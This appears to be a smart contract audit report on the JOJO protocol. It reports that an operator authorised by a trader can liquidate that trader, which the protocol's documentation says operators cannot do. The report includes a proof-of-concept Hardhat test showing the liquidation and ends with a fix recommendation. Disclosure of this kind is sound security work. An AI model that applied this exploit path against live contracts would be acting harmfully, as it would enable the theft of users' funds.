# Malicious operator can liquidates the client who assigned him as operator

## Summary

The operator can create malicious trades causing that the malicious operator liquidates the client who assigned him as an operator.

## Vulnerability Detail

An user can assign an operator via [Operation.setOperator()](https://github.com/sherlock-audit/2023-04-jojo/blob/main/smart-contract-EVM/contracts/lib/Operation.sol#L129) function. As the [documentation](https://jojo-docs.netlify.app/operator/) says: *Users can authorize the operator to a professional trading team so that professional traders can help users operate accounts to achieve the effect of high returns.*

That allows the operator to:
- Sign orders on [behalf his client](https://github.com/sherlock-audit/2023-04-jojo/blob/main/smart-contract-EVM/contracts/impl/JOJOExternal.sol#L141).

```solidity
File: JOJOExternal.sol
103:     function approveTrade(address orderSender, bytes calldata tradeData)
104:         external
105:         onlyRegisteredPerp
106:         returns (
107:             address[] memory, // traderList
108:             int256[] memory, // paperChangeList
109:             int256[] memory // creditChangeList
110:         )
111:     {
...
...
138:             // requirements
139:             require(
140:                 recoverSigner == order.signer ||
141:                     state.operatorRegistry[order.signer][recoverSigner],
142:                 Errors.INVALID_ORDER_SIGNATURE
143:             );
...
...
```

- Liquidate positions on [behalf his client](https://github.com/sherlock-audit/2023-04-jojo/blob/main/smart-contract-EVM/contracts/lib/Liquidation.sol#L345)

```solidity
File: Liquidation.sol
327:     function requestLiquidation(
328:         Types.State storage state,
329:         address perp,
330:         address executor,
331:         address liquidator,
332:         address liquidatedTrader,
333:         int256 requestPaperAmount
334:     )
335:         external
336:         returns (
337:             int256 liqtorPaperChange,
338:             int256 liqtorCreditChange,
339:             int256 liqedPaperChange,
340:             int256 liqedCreditChange
341:         )
342:     {
343:         require(
344:             executor == liquidator ||
345:                 state.operatorRegistry[liquidator][executor],
346:             Errors.INVALID_LIQUIDATION_EXECUTOR
347:         );
348:         require(
349:             liquidatedTrader != liquidator,
350:             Errors.SELF_LIQUIDATION_NOT_ALLOWED
351:         );
...
...
```

The problem is that the operator can act maliciously then the operator can creates positions that affect his client and then liquidate the client who assigned him as operator.

I created a test where it is possible to see the assigned operator liquidates the client who assigned him as operator. Test steps:

1. Trader1 assigns an operator to the operator.address via [setOperator()](https://github.com/sherlock-audit/2023-04-jojo/blob/main/smart-contract-EVM/contracts/lib/Operation.sol#L129) function. The operator creates malicious positions and so on
2. Assert balance of the trader1 (the user to be liquidated).
3. Malicious operator liquidates his client (trader1.addresss) who assigned him as operator.
4. The liquidated user (trader1) was liquidated by the operator who was authorized by trader1.

```javascript
File: liquidation-test.ts
299:     it("operator liquidates the client who assigned him", async () => {
300:       // The malicious operator can liquidates the client who assigned him.
301:       // 1. Trader1 assigns his operator to the operator.address. The operator creates malicious positions and so on
302:       // 2. Assert balance of the trader1 (the user to be liquidated).
303:       // 3. Malicious operator liquidates his client (trader1.addresss) who assigned him as operator.
304:       // 4. The liquidated user (trader1) was liquidated by the operator who was authorized by trader1.
305:       //
306:       let operator = trader2;
307:       //
308:       // 1. Trader1 assigns his operator to the operator.address. The operator creates malicious positions and so on
309:       // 
310:       await context.dealer
311:         .connect(trader1)
312:         .setOperator(operator.address, true);
313:       //
314:       // 2. Assert balance of the trader1 (the user to be liquidated).
315:       //
316:       await checkBalance(perp0, trader1.address, "1", "-30015");
317:       //
318:       // 3. Malicious operator liquidates his client (trader1.addresss) who assigned him as operator.
319:       //
320:       await perp0
321:         .connect(operator)
322:         .liquidate(
323:           operator.address, // liquidator
324:           trader1.address, // liquidatedAddress
325:           utils.parseEther("1"),//requestPaper
326:           utils.parseEther("-20394")//expectCredit
327:         );
328:       //
329:       // 4. The liquidated user (trader1) was liquidated by the operator who was authorized by trader1.
330:       //
331:       await checkBalance(perp0, trader1.address, "0", "0"); // the trader1 is liquidated by the operator
332:       await checkCredit(context, insurance, "203.94", "0");
333:       await checkCredit(context, trader1.address, "-4824.94", "5000");
334:       expect(await context.dealer.isSafe(trader1.address)).to.be.true;
335:     });
```

## Impact

The operator's client can be liquidated by a malicious operator who was assigned by the client itself. Since the operator can manage the client's positions, the operator can act maliciously then liquidate the user who assigned him as operator.

The [documentation](https://jojo-docs.netlify.app/operator/) says *The operator is the client's agent and can sign an order on your behalf, but cannot withdraw or liquidate for the client. Users can set the operator of the account by calling IDealer#setOperator.*. So the operator should not have to possibility to liquidate on behalf the client.

## Code Snippet

- The [JOJOExternal.approveTrade()](https://github.com/sherlock-audit/2023-04-jojo/blob/main/smart-contract-EVM/contracts/impl/JOJOExternal.sol#L103) function helps to create positions by the trader or an operator.
- The [Liquidation.requestLiquidation()](https://github.com/sherlock-audit/2023-04-jojo/blob/main/smart-contract-EVM/contracts/lib/Liquidation.sol#L327) helps to liquidate positions by the trader or an operator.
- The [setOperator()](https://github.com/sherlock-audit/2023-04-jojo/blob/main/smart-contract-EVM/contracts/lib/Operation.sol#L129) function helps to assign an operator.

## Tool used

Manual review

## Recommendation

Don't allow the operator to liquidate the client who assigned him as operator.
